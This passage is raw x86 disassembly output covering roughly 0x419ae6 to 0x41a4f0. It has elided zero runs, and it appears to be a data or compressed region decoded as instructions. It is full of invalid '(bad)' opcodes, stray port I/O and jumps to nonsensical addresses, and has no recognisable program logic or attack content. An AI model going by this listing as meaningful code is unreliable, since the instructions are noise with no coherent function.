  419ae6:	jo     0x419a90
  419ae8:	std    
  419ae9:	jmp    0xae6b34e2
  419aee:	in     eax,dx
  419aef:	popa   
  419af0:	or     BYTE PTR [ebp-0x5c],dl
  419af3:	sbb    DWORD PTR [eax+0x6c],eax
  419af6:	inc    eax
  419af7:	das    
  419af8:	imul   BYTE PTR [edx-0x2d]
  419afb:	inc    ebx
  419afc:	add    al,0xe9
  419afe:	cmp    eax,0xc4cc73a8
  419b03:	fst    QWORD PTR [eax]
  419b05:	in     eax,dx
  419b06:	cmp    eax,0x2567875b
  419b0b:	pop    esp
  419b0c:	add    cl,ch
	...
  419b36:	add    BYTE PTR [eax],al
  419b38:	std    
  419b39:	mov    al,ds:0xa821ed86
  419b3e:	std    
  419b3f:	add    BYTE PTR [edi],cl
  419b41:	pop    esp
  419b42:	add    BYTE PTR [eax],al
  419b44:	mov    fs,WORD PTR [esi]
  419b46:	or     eax,0x895c1704
  419b4b:	xchg   bh,ch
  419b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b4e:	std    
  419b4f:	push   DWORD PTR [edi]
  419b51:	mov    esp,0xa7f7868a
  419b56:	std    
  419b57:	call   FWORD PTR [ebp-0x5e]
  419b5a:	pop    esi
  419b5b:	mov    bh,bl
  419b5d:	pusha  
  419b5e:	adc    DWORD PTR [eax],0xffffffeb
  419b61:	pop    ebx
  419b62:	add    BYTE PTR [esi-0x4e],bl
  419b65:	sbb    DWORD PTR ds:0x71615a00,eax
  419b6b:	mov    eax,0x1fe6754
  419b70:	xor    eax,eax
  419b72:	add    DWORD PTR [eax],eax
  419b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b75:	and    ch,BYTE PTR [eax+0x9]
  419b78:	retf   0x8ab6
  419b7b:	xchg   BYTE PTR [edi+0xefffda7],ah
  419b81:	es adc eax,0x405ba704
  419b87:	mov    DWORD PTR [ecx],eax
  419b89:	rol    BYTE PTR [ecx],0x0
  419b8c:	xchg   edi,eax
  419b8d:	adc    DWORD PTR es:[eax],0x6b
  419b91:	pop    ebx
  419b92:	add    BYTE PTR [ebx+0x1b6d9],cl
  419b98:	push   edi
  419b99:	and    DWORD PTR ds:0x2,ecx
	...
  419bc3:	add    BYTE PTR [eax],al
  419bc5:	add    BYTE PTR [ebp+0x7788bf60],ah
  419bcb:	pop    esp
  419bcc:	mov    ds,WORD PTR [ebx+ebx*2]
  419bcf:	pop    ebx
  419bd0:	add    BYTE PTR [ebp+0x6e],dh
  419bd3:	and    al,BYTE PTR [ebx+0x5b5b10]
  419bd9:	mov    DWORD PTR [ecx+0x270001b7],ebp
  419bdf:	fwait
  419be0:	mov    BYTE PTR [esi-0x24fc2],ch
  419be6:	and    DWORD PTR [esi+edi*2],edi
  419be9:	cmovb  esi,DWORD PTR [ecx+eax*1-0x2434775]
  419bf1:	dec    DWORD PTR [ecx]
  419bf3:	cmp    esi,esp
  419bf5:	add    esp,ebp
  419bf7:	ss inc edx
  419bf9:	xchg   DWORD PTR [esi-0x4d],ecx
  419bfc:	jae    0x419c19
  419bfe:	cmp    dh,BYTE PTR [ecx+eax*1+0x7e394775]
  419c05:	(bad)  
  419c08:	add    DWORD PTR [ecx-0x24340],ecx
  419c0e:	shl    esp,1
  419c10:	jp     0x419bbf
  419c12:	sub    bh,BYTE PTR [eax+0x3eb70001]
  419c18:	hlt    
  419c19:	add    edi,DWORD PTR [esi]
  419c1b:	mov    ah,0x78
  419c1d:	test   DWORD PTR [esi-0x40],edx
  419c20:	add    DWORD PTR [eax],eax
  419c22:	mov    ah,0xbc
  419c24:	dec    eax
  419c26:	mov    al,ds:0xd67773
	...
  419c53:	add    BYTE PTR [ebp+0x47],bl
  419c56:	jl     0x419c5f
  419c58:	in     al,dx
  419c59:	sub    BYTE PTR [esi],dh
  419c5b:	out    0x67,eax
  419c5d:	mov    al,0x4
  419c5f:	(bad)  
  419c60:	mov    ch,0x7d
  419c62:	jg     0x419c43
  419c64:	inc    edx
  419c65:	fs ja  0x419c35
  419c68:	data16 clc 
  419c6a:	add    eax,0x343969fe
  419c6f:	sbb    BYTE PTR [edi-0x4e],0xb2
  419c73:	mov    cl,BYTE PTR [eax+0x51fb448c]
  419c79:	in     eax,0x80
  419c7b:	out    0x3f,al
  419c7d:	inc    ebp
  419c7e:	ja     0x419c4d
  419c80:	push   esi
  419c81:	xor    BYTE PTR ds:0x465b39fe,al
  419c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c88:	xchg   edx,eax
  419c89:	cdq    
  419c8a:	out    dx,eax
  419c8b:	add    edi,DWORD PTR [ebp-0x4ffd696d]
  419c91:	inc    esi
  419c92:	jecxz  0x419c97
  419c94:	fcom   DWORD PTR ds:[eax]
  419c97:	sti    
  419c98:	mov    al,BYTE PTR [edx+esi*2+0x7d]
  419c9c:	cmp    DWORD PTR [edi-0x19],ebx
  419c9f:	add    esi,DWORD PTR [edi-0x6003024]
  419ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ca7:	jp     0x419c4c
  419ca9:	inc    esi
  419caa:	jecxz  0x419caf
  419cac:	ds aam 0x6d
  419caf:	repz cmp eax,0xc378e75b
  419cb5:	inc    edx
  419cb6:	jmp    0x419cbb
	...
  419ce0:	add    BYTE PTR [eax],al
  419ce2:	ds rcl edi,1
  419ce5:	add    esp,ebp
  419ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce8:	sub    DWORD PTR [ebx+0x31],edi
  419ceb:	pop    esp
  419cec:	pop    ebp
  419ced:	out    0x3d,eax
  419cef:	pop    ebx
  419cf0:	out    0x8e,eax
  419cf2:	push   esi
  419cf3:	shl    BYTE PTR [ebp-0xd],cl
  419cf6:	cmp    eax,0xbb7ae75b
  419cfb:	inc    edx
  419cfc:	jecxz  0x419d01
  419cfe:	sbb    esi,DWORD PTR ds:[eax+0x55]
  419d02:	xor    eax,0xb703e75f
  419d07:	(bad)  
  419d09:	inc    DWORD PTR [ecx+0x517d62a5]
  419d0f:	pop    edi
  419d10:	out    0x3,eax
  419d12:	les    ecx,FWORD PTR [edx-0x17]
  419d15:	aad    0x68
  419d17:	cwde   
  419d18:	pop    edi
  419d19:	adc    al,0x61
  419d1b:	xlat   BYTE PTR ds:[ebx]
  419d1c:	jmp    0x419d25
  419d1e:	ds pop ebx
  419d20:	cmp    al,0x1d
  419d22:	(bad)  
  419d23:	(bad)  
  419d25:	pop    es
  419d26:	ds pop ebx
  419d28:	add    BYTE PTR [eax-0x4c],ah
  419d2b:	inc    edx
  419d2c:	add    al,0xe9
  419d2e:	cmp    eax,0x5e57871b
  419d33:	pop    edi
  419d34:	add    cl,ch
  419d36:	mov    edx,0x3ded10dd
  419d3b:	pop    ebx
  419d3c:	mov    DWORD PTR [edi+0x3a],esp
  419d3f:	pop    edi
  419d40:	add    cl,ch
  419d42:	ret    
  419d43:	dec    ebx
  419d44:	add    bl,BYTE PTR [ebx+0x0]
	...
  419d6e:	add    BYTE PTR [eax],al
  419d70:	cmp    al,0x98
  419d72:	mov    cl,bl
  419d74:	cmp    dl,ch
  419d76:	sbb    al,0xe5
  419d78:	cmp    eax,0xc100735b
  419d7d:	fst    QWORD PTR [eax]
  419d7f:	in     eax,0x3d
  419d81:	pop    ebx
  419d82:	xchg   DWORD PTR [edi+0x42],ebp
  419d85:	pop    edi
  419d86:	add    cl,ch
  419d88:	jge    0x419d66
  419d8a:	scas   al,BYTE PTR es:[edi]
  419d8b:	in     eax,0x39
  419d8d:	pop    ebx
  419d8e:	add    BYTE PTR [eax-0x4c],dh
  419d91:	dec    ebx
  419d92:	add    al,0xe9
  419d94:	cmp    eax,0x41d186d2
  419d99:	pop    ebx
  419d9a:	add    BYTE PTR [ecx],bh
  419d9c:	pop    edx
  419d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d9e:	mov    edi,ebp
  419da0:	inc    ecx
  419da1:	pop    ebx
  419da2:	add    BYTE PTR [edx+eax*2+0x41f986d2],bl
  419da9:	pop    ebx
  419daa:	add    BYTE PTR [eax-0x3c],dh
  419dad:	inc    ebx
  419dae:	add    al,0xe9
  419db0:	cmp    eax,0x5e47871b
  419db5:	pop    edi
  419db6:	add    cl,ch
  419db8:	retf   0x10dd
  419dbb:	in     eax,dx
  419dbc:	cmp    eax,0x4567895b
  419dc1:	pop    edi
  419dc2:	add    cl,ch
  419dc4:	lea    edi,[ebx-0x1]
  419dc7:	pop    esi
  419dc8:	cmp    DWORD PTR [edi+0x0],ebx
  419dcb:	add    BYTE PTR [edi+0x23],ah
  419dce:	adc    eax,0x447e18b
	...
  419dfb:	add    BYTE PTR [eax],al
  419dfd:	add    BYTE PTR [edi-0x29],dl
  419e00:	xchg   BYTE PTR [eax],bl
  419e02:	and    ebx,DWORD PTR [eax+0x0]
  419e05:	inc    eax
  419e06:	scas   al,BYTE PTR es:[edi]
  419e07:	jmp    0x8685:0x5817041c
  419e0e:	daa    
  419e0f:	pop    esp
  419e10:	add    BYTE PTR [eax],al
  419e12:	pushf  
  419e13:	rcr    BYTE PTR [eax],cl
  419e15:	add    al,0x27
  419e17:	pop    eax
  419e18:	shl    BYTE PTR [eax],1
  419e1a:	push   ss
  419e1b:	retf   0x41c
  419e1e:	pop    ss
  419e1f:	pop    eax
  419e20:	jno    0x419e3b
  419e22:	pop    esp
  419e23:	rcl    BYTE PTR [eax],cl
  419e25:	add    al,0xe7
  419e27:	push   edi
  419e28:	test   DWORD PTR [esi+0x533f],eax
  419e2e:	xchg   edi,eax
  419e2f:	(bad)  
  419e30:	scas   al,BYTE PTR es:[edi]
  419e31:	sbb    al,0xe3
  419e33:	push   edi
  419e34:	add    BYTE PTR [ecx+0x44861],cl
  419e3a:	xlat   BYTE PTR ds:[ebx]
  419e3b:	aam    0xb6
  419e3d:	sbb    bl,dl
  419e3f:	push   edi
  419e40:	add    al,dl
  419e42:	inc    ecx
  419e43:	cmp    DWORD PTR [ecx-0x3e],ebx
  419e46:	scas   eax,DWORD PTR es:[edi]
  419e47:	push   edi
  419e48:	xchg   DWORD PTR [ebx+eax*4+0x5b],eax
  419e4c:	push   esi
  419e4d:	push   edi
  419e4e:	sbb    al,0x24
  419e50:	and    al,0x10
  419e52:	sbb    al,0xaf
  419e54:	cmp    DWORD PTR [eax+0x730057a7],eax
  419e5a:	imul   ebx,esp,0xfffffffb
  419e5d:	add    al,0x4
  419e5f:	inc    ecx
  419e60:	aaa    
  419e61:	xchg   BYTE PTR [eax],al
	...
  419e8b:	add    BYTE PTR [ebx+0x1300005b],al
  419e91:	add    esi,ebx
  419e93:	fdivr  DWORD PTR [edi+ebx*4]
  419e96:	jg     0x419e78
  419e98:	ds mov ah,0x60
  419e9b:	cmp    DWORD PTR [esi-0x42],0xb246c25f
  419ea2:	cmp    al,0x86
  419ea4:	and    bh,BYTE PTR [esi-0x5135ffff]
  419eaa:	cmp    BYTE PTR ds:[esi],0xb4
  419eae:	add    DWORD PTR [ecx+0x3b],esi
  419eb1:	xor    eax,0xa51502ef
  419eb6:	add    BYTE PTR ds:[ebx],bh
  419eb9:	mov    ah,0x1
  419ebb:	jb     0x419efc
  419ebd:	inc    ecx
  419ebe:	cmp    eax,0x1b49300
  419ec3:	jb     0x419f04
  419ec5:	jno    0x419e88
  419ec7:	call   0xc0c4e402
  419ecc:	cmp    eax,0xf426ec44
  419ed1:	cmp    edi,edi
  419ed3:	push   ebp
  419ed4:	mov    ch,0x72
  419ed6:	mov    ebx,eax
  419ed8:	(bad)  
  419ed9:	test   al,0xfb
  419edb:	std    
  419edc:	fcos   
  419ede:	inc    edi
  419edf:	sbb    BYTE PTR [ebp+edi*8+0x60],al
  419ee3:	pop    esi
  419ee4:	cld    
  419ee5:	lods   al,BYTE PTR ds:[esi]
  419ee6:	add    DWORD PTR [ebp-0x2a],edx
  419ee9:	mov    eax,0xd1b9fdfb
  419eee:	test   al,al
	...
  419f18:	add    BYTE PTR [eax],al
  419f1a:	cmp    bl,BYTE PTR [edx-0x1ac1f73d]
  419f20:	mov    WORD PTR [edx+ebx*2-0x44],ds
  419f24:	push   esi
  419f25:	push   esi
  419f26:	lds    eax,FWORD PTR [ebx-0x7d]
  419f29:	mov    esi,0x1b066
  419f2e:	ds leave 
  419f30:	adc    BYTE PTR [ebp+eiz*1-0x40fffe4d],al
  419f37:	lods   eax,DWORD PTR ds:[esi]
  419f38:	add    DWORD PTR [eax],0x74e75b3e
  419f3e:	sub    esi,ebx
  419f40:	pop    ebx
  419f41:	sub    BYTE PTR [esi+0x57],al
  419f44:	pop    edx
  419f45:	ds pushw 0xffd2
  419f49:	add    BYTE PTR [eax-0x2a],dl
  419f4c:	mov    ch,0xeb
  419f4e:	push   cs
  419f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f50:	mov    esi,0xbf91b400
  419f55:	std    
  419f56:	xor    al,0xa2
  419f58:	scas   al,BYTE PTR es:[edi]
  419f59:	lea    edi,[edx+0x77]
  419f5c:	dec    DWORD PTR [eax+edx*8+0x3e03e34a]
  419f63:	aad    0xa2
  419f65:	daa    
  419f66:	sbb    DWORD PTR [eax+eiz*4+0x5],ebx
  419f6a:	rol    DWORD PTR [ecx],1
  419f6c:	outs   dx,DWORD PTR ds:[esi]
  419f6d:	add    eax,0x7d7d90b
  419f72:	ds pop ebx
  419f74:	pusha  
  419f75:	mov    eax,ds:0x3e75722
  419f7a:	nop
  419f7b:	add    dl,al
  419f7d:	lds    eax,FWORD PTR [eax]
	...
  419fa7:	add    BYTE PTR [esi],dh
  419fa9:	pop    ebx
  419faa:	push   0xffffffd0
  419fac:	jecxz  0x41a009
  419fae:	xchg   ebp,eax
  419faf:	pop    ds
  419fb0:	inc    edx
  419fb1:	pop    ebx
  419fb2:	out    0x8e,eax
  419fb4:	arpl   WORD PTR [esp+edi*4+0x1a],dx
  419fb8:	mov    bh,0xd8
  419fba:	xlat   BYTE PTR ds:[ebx]
  419fbb:	pop    es
  419fbc:	ds pop ebx
  419fbe:	pusha  
  419fbf:	mov    DWORD PTR [esi+0x57],edx
  419fc2:	out    0x3,eax
  419fc4:	(bad)  
  419fc5:	rcl    DWORD PTR [ebp+0x1f],cl
  419fc8:	inc    edx
  419fc9:	pop    ebx
  419fca:	out    0x8a,eax
  419fcc:	mov    eax,0x3e03eb4a
  419fd1:	(bad)  
  419fd2:	sbb    edi,DWORD PTR gs:[edx]
  419fd5:	pop    ebx
  419fd6:	out    0x8d,eax
  419fd8:	ss pop ebp
  419fda:	xor    BYTE PTR [ecx],al
  419fdc:	jle    0x419fb0
  419fde:	add    cl,ah
  419fe0:	cmp    al,0xe1
  419fe2:	sbb    al,0xe5
  419fe4:	cmp    eax,0xb500735b
  419fe9:	fcom   DWORD PTR [eax]
  419feb:	in     eax,0x3d
  419fed:	pop    ebx
  419fee:	xchg   DWORD PTR [edi+0x3a],ebp
  419ff1:	push   edi
  419ff2:	add    cl,ch
  419ff4:	std    
  419ff5:	fldcw  WORD PTR [esi+0x5b41e5]
  419ffb:	jo     0x419fb5
  419ffd:	dec    edx
  419ffe:	add    al,0xe9
  41a000:	cmp    eax,0x39d186d2
  41a005:	pop    ebx
  41a006:	add    BYTE PTR [ecx-0x572e2d9e],bh
	...
  41a034:	add    BYTE PTR [eax],al
  41a036:	adc    al,0x54
  41a038:	sub    DWORD PTR [ebx-0x6076f2c4],0x86fa9922
  41a042:	or     ebx,edx
  41a044:	xchg   cl,bl
  41a046:	cmp    DWORD PTR [ebx+0x0],ebx
  41a049:	popa   
  41a04a:	pop    edx
  41a04b:	jecxz  0x41a04c
  41a04d:	call   0x6f40fb8f
  41a052:	push   edx
  41a053:	push   edi
  41a054:	add    cl,ch
  41a056:	mov    dl,0xc1
  41a058:	and    al,0xed
  41a05a:	cmp    eax,0xba527f5b
  41a05f:	pop    ebx
  41a060:	add    cl,ch
  41a062:	dec    esp
  41a063:	inc    ebx
  41a064:	or     ebp,0x62024319
  41a06a:	push   cs
  41a06b:	ja     0x41a085
  41a06d:	cwde   
  41a06e:	les    edx,FWORD PTR [ecx-0x615b8118]
  41a074:	std    
  41a075:	mov    esi,0x2b590403
  41a07a:	dec    edx
  41a07b:	pop    ebx
  41a07c:	jg     0x41a090
  41a07e:	cmp    bl,BYTE PTR [eax+eax*1+0x0]
  41a082:	xchg   edi,eax
  41a083:	sub    al,BYTE PTR [ecx+ebp*1]
  41a086:	fstp   TBYTE PTR [eax+0x18]
  41a089:	sub    DWORD PTR [esp+ebx*2+0x79],0x42a6700
  41a091:	sub    DWORD PTR [ebx],ebx
  41a093:	jae    0x41a0ad
  41a095:	mov    edx,DWORD PTR [ebx]
  41a097:	jae    0x41a0b1
  41a099:	push   ecx
	...
  41a0c2:	add    BYTE PTR [eax],al
  41a0c4:	fmul   QWORD PTR [ebp-0x5e929318]
  41a0ca:	sti    
  41a0cb:	pop    edi
  41a0cc:	and    DWORD PTR [edx],edi
  41a0ce:	push   edi
  41a0cf:	ret    0x5c4f
  41a0d2:	ret    
  41a0d3:	xchg   BYTE PTR [edi],bh
  41a0d5:	push   ebx
  41a0d6:	add    BYTE PTR [eax],al
  41a0d8:	es pop esp
  41a0da:	add    BYTE PTR [eax],al
  41a0dc:	xchg   esi,eax
  41a0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0de:	add    BYTE PTR [eax],0x17
  41a0e1:	pop    esp
  41a0e2:	outs   dx,DWORD PTR ds:[esi]
  41a0e3:	dec    ecx
  41a0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0e5:	and    BYTE PTR [eax+ebx*1],ah
  41a0e8:	sbb    ebp,DWORD PTR ds:0x78a13b42
  41a0ee:	add    al,0x0
  41a0f0:	pop    ss
  41a0f1:	sub    BYTE PTR [edx],bh
  41a0f3:	call   0x3d42d5
  41a0f8:	pop    esp
  41a0f9:	mov    gs,eax
  41a0fb:	add    ebx,DWORD PTR [ebp-0x5f]
  41a0fe:	sti    
  41a0ff:	mov    edx,DWORD PTR [ecx]
  41a101:	mov    ah,0xc9
  41a103:	stc    
  41a104:	jo     0x41a0a7
  41a106:	mov    al,BYTE PTR [ebx+edi*1+0x3f]
  41a10a:	xchg   DWORD PTR [esi+0x57e7],ecx
  41a110:	dec    ebp
  41a111:	lea    esp,[ecx+eax*1]
  41a114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a115:	mov    DWORD PTR [edx],eax
  41a117:	ret    0xd3c0
  41a11a:	std    
  41a11b:	(bad)  
  41a11c:	sbb    DWORD PTR [esp+eax*1+0x0],ecx
  41a120:	xchg   edi,eax
  41a121:	into   
  41a122:	sahf   
  41a123:	and    al,0x3e
  41a125:	scas   al,BYTE PTR es:[edi]
  41a126:	add    DWORD PTR [eax],eax
	...
  41a150:	add    BYTE PTR [eax],al
  41a152:	lock out dx,al
  41a154:	pop    edx
  41a155:	ret    0xb236
  41a158:	or     ch,0x81
  41a15b:	mov    dl,0xbb
  41a15d:	sbb    al,0x42
  41a15f:	mov    dl,0x1
  41a161:	mov    esp,ecx
  41a163:	mov    edx,0x2fb51778
  41a168:	adc    al,0x4
  41a16a:	ds mov dl,0x8a
  41a16d:	xchg   BYTE PTR [esi],dh
  41a16f:	scas   al,BYTE PTR es:[edi]
  41a170:	add    DWORD PTR [eax],eax
  41a172:	(bad)  
  41a173:	cmp    ch,BYTE PTR [esi+0x1b2421c]
  41a179:	xchg   DWORD PTR [eax+0x3e000581],edi
  41a17f:	cmp    DWORD PTR [esi+0x1b43a18],eax
  41a185:	mov    cl,BYTE PTR [esi-0x4e]
  41a188:	iret   
  41a189:	(bad)  
  41a18a:	cld    
  41a18b:	sub    al,0x14
  41a18d:	(bad)  
  41a18e:	fld    TBYTE PTR [eax+0x473e0005]
  41a194:	sbb    DWORD PTR [ecx+0x584c0],ecx
  41a19a:	sub    eax,DWORD PTR ds:[esi+0x1b44218]
  41a1a1:	inc    eax
  41a1a2:	(bad)  
  41a1a3:	pop    esi
  41a1a4:	and    BYTE PTR [esi+edi*1],al
  41a1a7:	mov    ah,0x8a
  41a1a9:	xchg   BYTE PTR [esi-0x48],cl
  41a1ac:	add    DWORD PTR [eax],eax
  41a1ae:	lds    ebp,FWORD PTR [esi]
  41a1b0:	sbb    al,0x4
  41a1b2:	ds mov ah,0xd1
  41a1b5:	and    BYTE PTR [eax],al
	...
  41a1df:	add    BYTE PTR ds:0x3e042836,al
  41a1e5:	mov    ah,0x75
  41a1e7:	jb     0x41a1ae
  41a1e9:	jno    0x41a1ac
  41a1eb:	call   0x205d336
  41a1f0:	push   cs
  41a1f1:	pop    ebx
  41a1f2:	setbe  BYTE PTR [ecx-0x3776e162]
  41a1f9:	dec    ebx
  41a1fa:	jmp    0x41a1ff
  41a1fc:	ds shl eax,cl
  41a1ff:	mov    ebx,0x3e79e89
  41a204:	sbb    eax,0x5b3e07d7
  41a20a:	pusha  
  41a20b:	sahf   
  41a20c:	sbb    dl,BYTE PTR [edi-0x19]
  41a20f:	add    ebp,ecx
  41a211:	mov    eax,ds:0x5b3e0367
  41a216:	pop    edx
  41a217:	sbb    al,0xbf
  41a219:	das    
  41a21a:	or     ebx,DWORD PTR [esp+edi*1]
  41a21d:	shl    BYTE PTR [ebx],cl
  41a21f:	sub    BYTE PTR [esi],ah
  41a221:	or     DWORD PTR [edx-0x33],esi
  41a224:	push   esi
  41a225:	aaa    
  41a226:	sar    ah,0x3b
  41a229:	(bad)  
  41a22a:	adc    al,0x5f
  41a22c:	xchg   edi,eax
  41a22d:	cdq    
  41a22e:	fild   WORD PTR [ebx]
  41a230:	test   eax,0x3e06e7a2
  41a235:	pop    ebx
  41a236:	sbb    DWORD PTR [eax],ecx
  41a238:	popa   
  41a239:	pop    ss
  41a23a:	retf   
  41a23b:	sbb    edx,DWORD PTR [ecx+0x3e7ee7a2]
  41a241:	pop    ebx
  41a242:	stc    
  41a243:	push   0x0
	...
  41a26d:	add    BYTE PTR [ecx+0x17],bl
  41a270:	ret    
  41a271:	sbb    eax,edi
  41a273:	push   es
  41a274:	retf   
  41a275:	sbb    ecx,DWORD PTR [edx+edx*8-0x5bce1463]
  41a27c:	data16 cld 
  41a27e:	cmp    ebp,0xffffffbb
  41a281:	pop    eax
  41a282:	cld    
  41a283:	push   edx
  41a284:	out    0x2,eax
  41a286:	nop
  41a287:	ds jecxz 0x41a28d
  41a28a:	ds sub al,ah
  41a28d:	mov    BYTE PTR [eax+0x3e03e34a],bh
  41a293:	aam    0x0
  41a295:	outs   dx,DWORD PTR ds:[esi]
  41a296:	push   ebp
  41a297:	push   edi
  41a298:	add    cl,ch
  41a29a:	std    
  41a29b:	aad    0xae
  41a29d:	add    eax,0x70005b36
  41a2a2:	ret    
  41a2a3:	dec    edx
  41a2a4:	add    al,0xe9
  41a2a6:	cmp    eax,0x41f186d4
  41a2ab:	pop    ebx
  41a2ac:	add    BYTE PTR [ecx],bl
  41a2ae:	pop    ebp
  41a2af:	sahf   
  41a2b0:	mov    ebx,0x5b41dd
  41a2b5:	jl     0x41a30b
  41a2b7:	aam    0x86
  41a2b9:	fld    DWORD PTR [ecx+0x5b]
  41a2bc:	add    BYTE PTR [eax-0x44],dh
  41a2bf:	inc    edx
  41a2c0:	add    al,0xe9
  41a2c2:	cmp    eax,0x3687871b
  41a2c7:	push   edi
  41a2c8:	add    cl,ch
  41a2ca:	mov    edx,0x3ded10d4
  41a2cf:	pop    ebx
  41a2d0:	mov    DWORD PTR [edi+0x0],esp
	...
  41a2fb:	add    BYTE PTR [edx+0x57],bl
  41a2fe:	add    cl,ch
  41a300:	or     eax,0x5e15897c
  41a305:	inc    ebx
  41a306:	push   edx
  41a307:	jb     0x41a2fd
  41a309:	mov    bl,0xd4
  41a30b:	mov    eax,ds:0x375d9f15
  41a310:	ja     0x41a314
  41a312:	ret    0x3de1
  41a315:	rol    BYTE PTR [ebp+ecx*8+0x1],cl
  41a319:	rcl    BYTE PTR [eax-0x2639a17],cl
  41a31f:	mov    dl,0xca
  41a321:	push   edi
  41a322:	add    al,0xe9
  41a324:	cmp    eax,0xb3721725
  41a329:	dec    edi
  41a32a:	add    al,0xe9
  41a32c:	cmp    eax,0x3edfbf62
  41a331:	jb     0x41a2f2
  41a333:	sub    edi,DWORD PTR [esi]
  41a335:	pop    ebx
  41a336:	sub    DWORD PTR [eax],eax
  41a338:	push   ss
  41a339:	pop    edx
  41a33a:	add    BYTE PTR [eax-0x5a],ch
  41a33d:	pop    eax
  41a33e:	ret    0xa704
  41a341:	gs rol dl,0xa3
  41a345:	pop    eax
  41a346:	jg     0x41a334
  41a348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a349:	add    eax,0x3ccb8b51
  41a34e:	and    BYTE PTR [esi+0x74],dl
  41a351:	jge    0x41a2da
  41a353:	icebp  
  41a354:	ror    bh,1
  41a356:	pop    esp
  41a357:	and    al,0x67
  41a359:	iret   
  41a35a:	pop    esp
  41a35b:	and    al,0x5f
  41a35d:	pop    edi
  41a35e:	scas   al,BYTE PTR es:[edi]
  41a35f:	or     BYTE PTR [eax],al
	...
  41a389:	add    BYTE PTR [ebx+0x58],ah
  41a38c:	add    BYTE PTR [edi],cl
  41a38e:	aam    0xf3
  41a390:	add    BYTE PTR [eax],al
  41a392:	push   edi
  41a393:	lods   eax,DWORD PTR ds:[esi]
  41a394:	pop    es
  41a395:	(bad)  
  41a396:	ret    
  41a397:	cmp    al,0x0
  41a399:	add    BYTE PTR [edi+0x58],ah
  41a39c:	mov    DWORD PTR [ebx+eax*2+0x57],esp
  41a3a0:	xchg   DWORD PTR [esi-0x263ad],eax
  41a3a6:	stos   BYTE PTR es:[edi],al
  41a3a7:	rol    BYTE PTR [eax],1
  41a3a9:	push   0xc8375826
  41a3ae:	jno    0x41a3f8
  41a3b0:	xchg   DWORD PTR [esi-0x263d5],ecx
  41a3b6:	sbb    al,0x97
  41a3b8:	jbe    0x41a3be
  41a3ba:	cld    
  41a3bb:	xchg   esi,eax
  41a3bc:	out    0xb,eax
  41a3be:	cld    
  41a3bf:	xchg   esi,eax
  41a3c0:	add    DWORD PTR [eax],eax
  41a3c2:	das    
  41a3c3:	push   esi
  41a3c4:	add    bl,ch
  41a3c6:	in     eax,0x64
  41a3c8:	ror    BYTE PTR [ebx+0x45059],0xd7
  41a3cf:	push   eax
  41a3d0:	mov    dh,0x11
  41a3d2:	call   0x4c42e9c0
  41a3d7:	or     al,0x96
  41a3d9:	add    al,0x3e
  41a3db:	cmp    DWORD PTR ds:0x8b4bb58a,eax
  41a3e1:	or     al,0xb9
  41a3e3:	sub    BYTE PTR [edi+0x8],bh
  41a3e6:	inc    edx
  41a3e7:	mov    dl,0x1
  41a3e9:	or     eax,0xb60a81e8
	...
  41a416:	add    BYTE PTR [eax],al
  41a418:	(bad)  
  41a419:	mov    dl,0x8e
  41a41b:	dec    esp
  41a41c:	enter  0x8ead,0x96
  41a420:	inc    edx
  41a421:	mov    dh,0x1
  41a423:	add    bh,al
  41a425:	popf   
  41a426:	test   BYTE PTR [edi+0x1b23f],dh
  41a42c:	aas    
  41a42d:	and    al,0xfd
  41a42f:	add    edi,DWORD PTR [esi]
  41a431:	mov    dl,0x4
  41a433:	mov    es,WORD PTR [esi-0x52]
  41a436:	add    DWORD PTR [eax],eax
  41a438:	mov    ch,0x33
  41a43a:	std    
  41a43b:	add    edi,DWORD PTR [esi]
  41a43d:	mov    dl,0x8c
  41a43f:	enter  0x2c25,0x8
  41a443:	add    al,0x3e
  41a445:	mov    dl,0x82
  41a447:	idiv   DWORD PTR [esi]
  41a449:	sbb    al,BYTE PTR [ecx]
  41a44b:	add    al,cl
  41a44d:	lods   al,BYTE PTR ds:[esi]
  41a44e:	dec    ecx
  41a44f:	xchg   eax,eax
  41a451:	mov    ch,bh
  41a453:	push   DWORD PTR [ecx]
  41a455:	mov    WORD PTR [edi+0x1844208],fs
  41a45b:	or     eax,0xfdf76ebc
  41a460:	sbb    DWORD PTR [esi],ecx
  41a462:	inc    eax
  41a463:	and    al,0x4e
  41a465:	cs add al,0x65
  41a468:	aas    
  41a469:	test   BYTE PTR [edx+eax*8],bh
  41a46c:	mov    BYTE PTR [edx-0x2bddab76],cl
  41a472:	in     al,dx
  41a473:	pop    es
  41a474:	mov    ebp,0xc00d010c
  41a479:	mov    esi,0x1
	...
  41a4a6:	ds pop ebx
  41a4a8:	div    BYTE PTR [ecx-0x4e11a483]
  41a4ae:	test   DWORD PTR [edx+eiz*2+0x40],ebx
  41a4b2:	rcr    BYTE PTR [edi+0x62],0x38
  41a4b6:	mov    dh,0x56
  41a4b8:	inc    edx
  41a4b9:	or     edx,eax
  41a4bb:	into   
  41a4bc:	call   0x6627e2c4
  41a4c1:	and    al,0x42
  41a4c3:	pop    ebx
  41a4c4:	out    0x86,eax
  41a4c6:	cmp    ch,BYTE PTR [edx+0x2e]
  41a4c9:	inc    eax
  41a4ca:	bound  esi,QWORD PTR [edi-0x19]
  41a4cd:	or     edi,DWORD PTR [esi]
  41a4cf:	pop    ebx
  41a4d0:	sar    BYTE PTR [esi-0x69daaf4],cl
  41a4d6:	inc    edi
  41a4d7:	xchg   esi,eax
  41a4d8:	jnp    0x41a509
  41a4da:	(bad)
  41a4dd:	imul   esi,DWORD PTR [ecx-0x66],0xffffffb2
  41a4e1:	add    DWORD PTR [edx+0x5f],0x72e803e7
  41a4e8:	jb     0x41a46b
  41a4ea:	dec    edx
  41a4eb:	pop    edi
  41a4ec:	out    0x3,eax
  41a4ee:	pop    ss
  41a4ef:	xchg   ebx,eax
  41a4f0:	pop    ebp
